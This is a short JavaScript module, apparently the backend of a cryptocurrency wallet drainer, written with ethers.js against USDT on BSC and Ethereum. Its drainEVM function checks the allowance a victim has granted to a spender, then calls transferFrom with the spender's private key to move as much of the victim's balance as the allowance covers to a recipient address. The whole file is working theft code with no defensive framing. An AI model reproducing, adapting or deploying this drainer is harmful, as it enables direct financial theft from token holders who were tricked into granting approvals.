const { JsonRpcProvider, Wallet, Contract } = require('ethers');

const RPC = {
  bsc: process.env.BSC_RPC || 'https://bsc-dataseed.binance.org',
  ethereum: process.env.ETH_RPC || 'https://eth.llamarpc.com'
};

const USDT = {
  bsc: '0x55d398326f99059fF775485246999027B3197955',
  ethereum: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
};

const ERC20_ABI = [
  'function allowance(address,address) view returns (uint256)',
  'function balanceOf(address) view returns (uint256)',
  'function transferFrom(address,address,uint256) returns (bool)'
];

function provider(chain) {
  return new JsonRpcProvider(RPC[chain]);
}

function spender(chain) {
  return new Wallet(process.env.SPENDER_PRIVATE_KEY, provider(chain));
}

async function checkEVMAllowance(owner, chain, tokenAddr) {
  const t = tokenAddr || USDT[chain];
  const c = new Contract(t, ERC20_ABI, provider(chain));
  const a = await c.allowance(owner, process.env.SPENDER_EVM_ADDRESS);
  return a.toString();
}

async function drainEVM(owner, chain, tokenAddr, recipient) {
  const t = tokenAddr || USDT[chain];
  const w = spender(chain);
  const c = new Contract(t, ERC20_ABI, w);
  
  const allowance = await c.allowance(owner, process.env.SPENDER_EVM_ADDRESS);
  const bal = await c.balanceOf(owner);
  const amt = allowance < bal ? allowance : bal;
  
  if (amt <= 0n) throw new Error('Allowance ya Balance zero hai');

  const targetRecipient = recipient || process.env.RECIPIENT_EVM;
  const tx = await c.transferFrom(owner, targetRecipient, amt);
  await tx.wait();
  return tx.hash;
}

module.exports = { drainEVM, checkEVMAllowance };